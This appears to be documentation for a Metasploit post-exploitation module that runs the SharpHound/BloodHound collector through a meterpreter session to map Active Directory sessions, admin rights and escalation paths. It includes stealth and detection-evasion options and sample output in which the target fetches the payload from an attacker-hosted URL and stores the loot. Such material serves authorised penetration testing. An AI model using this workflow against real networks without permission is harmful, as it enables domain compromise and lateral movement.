## Vulnerable Application

  This module will execute the BloodHound C# Ingestor (aka SharpHound) to gather sessions, local admin, domain trusts and more. With this information BloodHound will easily identify highly complex privilage elevation attack paths that would otherwise be impossible to quickly identify within an Active Directory environment.

## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session
  3. Do: `use post/windows/gather/bloodhound`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. You should be able to see that the module is running a powershell in the target machine
  7. You should be ablte to see, after few minutes, that the module created a loot with the BloodHound results in zip format

## Options

  **CollectionMethode**

  The collection method to use. This parameter accepts a comma separated list of values. Accepted values are Default, Group, LocalAdmin, RDP, DCOM, GPOLocalGroup, Session, ObjectProps, ComputerOnly, LoggedOn, Trusts, ACL, Container, DcOnly, All. The default method is Default.

  **Domain**

  Specifies the domain to enumerate. If not specified, will enumerate the current domain your user context specifies.

  **SearchForest**

  Expands data collection to include all domains in the forest. The default value is false.
  
  **Stealth**

  Use stealth collection options, will sacrifice data quality in favor of much reduced network impact. The default value is false.

  **SkipGCDeconfliction**

  Skips Global Catalog deconfliction during session enumeration. This option can result in more inaccuracy in data. The default value is false.

  **ExcludeDC**

  Exclude domain controllers from session queries. Useful for ATA environments which detect this behavior. The default value is false.
 
  **OU**

  Limit enumeration to this OU. Takes a DistinguishedName.

  **DomainController**

  Specify which Domain Controller to request data from. Defaults to closest DC using Site Names.
  
  **LdapPort**

  Override the port used to connect to LDAP. The default value is false.
  
  **SecureLdap**

  Uses LDAPs instead of unencrypted LDAP on port 636. The default value is false.
  
  **IgnoreLdapCert**

  Ignores the certificate for LDAP. The default value is false.

  **LDAPUser**

  User to connect to LDAP with.
  
  **LDAPPass**

  Password for user you are connecting to LDAP with.

  **DisableKerbSigning**

  Disables Kerberos Signing on requests. The default value is false.

  **Threads**

  Specifies the number of threads to use during enumeration. The default value is 10.

  **PingTimeout**

  Specifies timeout for ping requests to computers in milliseconds. The default value is 259.

  **SkipPing**

  Skip all ping checks for computers. This option will most likely be slower as API calls will be made to all computers regardless of being up Use this option if ping is disabled on the network for some reason. The default value is false.

  **LoopDelay**

  Amount of time to wait between session enumeration loops in minutes. This option should be used in conjunction with the SessionLoop enumeration method. The default value is 300.
  
  **MaxLoopTime**

  Length of time to run looped session collection. Format: 0d0h0m0s or any variation of this format. Use in conjunction with -CollectionMethod SessionLoop. Default will loop for two hours.

## Expected Output

```
meterpreter > run post/windows/gather/bloodhound

[*] Using URL: http://0.0.0.0:8080/bvqUdtHUQ4De1O3
[*] Local IP: http://192.168.1.136:8080/bvqUdtHUQ4De1O3
[*] Invoking BloodHound with: Invoke-BloodHound -CollectionMethod Default -Threads 10 -JSONFolder "C:\Windows\TEMP" -PingTimeout 250 -LoopDelay 300 
[*] Initializing BloodHound at 6:44 AM on 4/29/2019
[*] Resolved Collection Methods to Group, LocalAdmin, Session, Trusts
[*] Starting Enumeration for uplift.local
[*] Status: 58 objects enumerated (+58 �/s --- Using 58 MB RAM )
[*] Finished enumeration for uplift.local in 00:00:00.6365050
[*] 0 hosts failed ping. 0 hosts timedout.
[*] 
[*] Compressing data to C:\Windows\TEMP\20190429064444_BloodHound.zip.
[*] You can upload this file directly to the UI.
[*] Finished compressing files!
```